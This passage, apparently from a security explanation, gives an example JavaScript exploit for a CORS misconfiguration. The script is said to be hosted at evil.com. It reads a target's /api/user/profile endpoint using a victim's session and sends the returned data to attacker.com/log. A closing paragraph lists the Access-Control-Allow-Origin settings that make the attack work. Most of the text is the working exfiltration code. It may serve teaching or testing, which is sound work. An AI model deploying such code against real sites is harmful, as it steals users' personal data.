Example JavaScript on attacker-controlled domain (`evil.com/exploit.js`): 
```javascript
fetch('<TARGET_URL>/api/user/profile', {
  method: 'GET',
  headers: {
    'Cookie': '<SESSION_TOKEN>'
  }
})
.then(response => {
  if (response.ok) {
    return response.json();
  } else {
    throw new Error('Network response was not ok');
  }
})
.then(data => {
  console.log('Received data:', data);
  // Send data to your server for logging
  fetch('https://attacker.com/log?data=' + encodeURIComponent(JSON.stringify(data)));
})
.catch(error => {
  console.error('There has been a problem with your fetch operation:', error);
});
```

This exploit relies on the target responding with `Access-Control-Allow-Origin: *` or `Access-Control-Allow-Origin: <TARGET_URL>` if requests are initiated from an origin that matches, or `Access-Control-Allow-Origin: evil.com` if the attacker controls the domain making the request and the target allows it.
